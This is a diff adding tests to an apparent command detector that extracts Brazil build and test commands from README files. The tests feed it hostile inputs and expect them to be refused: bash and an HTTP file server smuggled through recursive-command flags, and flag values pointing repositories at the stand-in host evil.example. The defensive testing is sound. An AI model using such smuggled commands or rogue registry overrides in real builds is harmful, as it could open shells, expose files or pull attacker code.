@@ -177,3 +177,29 @@ describe("fix round 1: Brazil launchers, negation, comments, secrets and package
     expect(byId(detection, "brazil-build")?.source).toEqual({ path: "docs/build.md", line: 3 });
   });
 });
+
+describe("fix round 2: recursive-cmd flags, unclosed comments, scheme-less URLs", () => {
+  const fenced = (...commands: string[]): string => doc("## Tests", "```", ...commands, "```");
+  it("allows only value-less flags before brazil-build in brazil-recursive-cmd", async () => {
+    for (const command of [
+      "brazil-recursive-cmd --exclude brazil-build python3 -mhttp.server",
+      "brazil-recursive-cmd -p brazil-build /bin/bash",
+      "brazil-recursive-cmd --allPackages --exclude brazil-build brazil-runtime-exec /bin/bash",
+      "brazil-recursive-cmd brazil-runtime-exec brazil-build",
+    ]) expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
+    for (const [command, args] of [["brazil-recursive-cmd --allPackages brazil-build unit-tests", ["--allPackages", "brazil-build", "unit-tests"]], ["brazil-recursive-cmd -a brazil-build test", ["-a", "brazil-build", "test"]], ["brazil-recursive-cmd brazil-build test", ["brazil-build", "test"]]] as const) {
+      expect(byId(await detect({ Config: CONFIG, "README.md": fenced(command) }), "brazil-test")?.value.command.args, command).toEqual(args);
+    }
+  });
+  it("hides everything after an unclosed HTML comment", async () => {
+    const detection = await detect({ Config: CONFIG, "README.md": doc("<!--", "## Tests", "```", "brazil-build test", "```") });
+    expect(detection.checks).toEqual([]);
+    const before = await detect({ Config: CONFIG, "README.md": doc("## Tests", "`brazil-build test`", "<!-- never closed", "`brazil-build release`") });
+    expect(before.checks.map((check) => check.value.command.args)).toEqual([["test"]]);
+  });
+  it("refuses a flag value that starts with //", async () => {
+    for (const command of ["brazil-build -Dmaven.repo.remote=//evil.example/repo test", "brazil-build --registry=//evil.example/x test"]) {
+      expect((await detect({ Config: CONFIG, "README.md": fenced(command) })).checks, command).toEqual([]);
+    }
+  });
+});
